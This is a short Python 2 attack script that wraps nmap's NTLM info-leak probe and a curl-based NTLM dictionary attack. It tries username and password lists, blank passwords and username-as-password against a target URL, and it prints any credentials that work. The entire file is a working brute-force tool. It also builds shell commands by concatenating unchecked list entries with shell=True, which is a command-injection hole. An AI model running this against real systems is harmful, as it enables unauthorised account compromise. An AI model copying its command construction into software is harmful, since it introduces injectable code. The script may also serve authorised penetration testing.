#!/usr/bin/python
# Simple wrapper for some command line NTLM attacks

import argparse
import sys
import os.path
import subprocess
from urlparse import urlparse
import re

def test_login( username, password, url ):
  global args
  username = username.strip()
  password = password.strip()
  print "[*] Testing " + username + " : " + password 
  cmd = "curl -s -I --ntlm --user " + username + ":" + password + " -k " + url
  out = subprocess.check_output( cmd, shell=True )
  m = re.match( "HTTP\/1.\d (\d{3})", out )
  if m.group(1) != "401":
    print "[+] FOUND: " + username + " : " + password
    if args.quitonsuccess:
      sys.exit(0)
    return True
  return False
  

parser = argparse.ArgumentParser(description="Wrapper for NTLM info leak and NTLM dictionary attack")
parser.add_argument("-u", "--user", help="Username to dictionary attack as")
parser.add_argument("-U", "--userlist", help="Username list to dictionary attack as")
parser.add_argument("-p", "--password", help="Password to dictionary attack as")
parser.add_argument("-d", "--domain", help="NTLM domain name to attack")
parser.add_argument("-P", "--passlist", help="Password list to dictionary attack as")
parser.add_argument("-i", "--info", action="store_true", help="Exploit NTLM info leak")
parser.add_argument("-l", "--login", action="store_true", help="Test logins (requires username and passwords)")
parser.add_argument("-s", "--same", action="store_true", help="Try password=username")
parser.add_argument("-b", "--blank", action="store_true", help="Try blank password")
parser.add_argument("-1", "--quitonsuccess", action="store_true", help="Stop as soon as the first credential is found")
parser.add_argument("url", help="URL of NTLM protected resource")
args = parser.parse_args()

if not args.url:
  parser.print_usage()
  sys.exit(2)

url = urlparse(args.url)
if not url.port:
  if url.scheme == 'https':
    port = 443
  else:
    port = 80
else:
  port = url.port

print 'Running against ' + url.geturl()

if args.info:
  # Run NTLM info leak
  cmd = "nmap -p" + str(port) + " --script http-ntlm-info --script-args http-ntlm-info.root="+url.path+" "+url.netloc
  print cmd
  os.system( cmd )

if ( args.user or args.userlist ) and ( args.password or args.passlist ):
  # Check user
  if args.userlist and not os.path.isfile(args.userlist):
    print 'Couldn\'t find ' + args.userlist
    parser.print_usage()
    sys.exit(2)

  # Check password
  if args.passlist and not os.path.isfile(args.passlist):
    print 'Couldn\'t find ' + args.passlist
    parser.print_usage()
    sys.exit(2)
  
  if args.passlist:
    print "Password list"
    fp = open( args.passlist, "r" )
    if args.user:  
      if args.same:
        test_login( args.user, args.user, url.geturl() )
      if args.blank:
        test_login( args.user, '', url.geturl() )
    for p in fp:
      if args.userlist:
        fu = open( args.userlist, "r" )
        for u in fu:
          # many users, many passwords
          test_login( u, p, url.geturl() )
          if args.same:
            test_login( u, u, url.geturl() )
          if args.blank:
            test_login( u, '', url.geturl() )
        fu.close()
      else:
        # One user, many passwords
        test_login( args.user, p, url.geturl() )
    fp.close()
  elif args.userlist:
    print "User list"
    fu = open( args.userlist, "r" )
    for u in fu:
      # Many users, one password
      test_login( u, args.password, url.geturl() )
      if args.same:
        test_login( u, u, url.geturl() )
      if args.blank:
        test_login( u, '', url.geturl() )
    fu.close()
  else:
    # One user, one password
    print "Single user / password" 
    test_login( args.user, args.password, url.geturl() )
    if args.blank:
      test_login( args.user, '', url.geturl() )
 
print "Done"
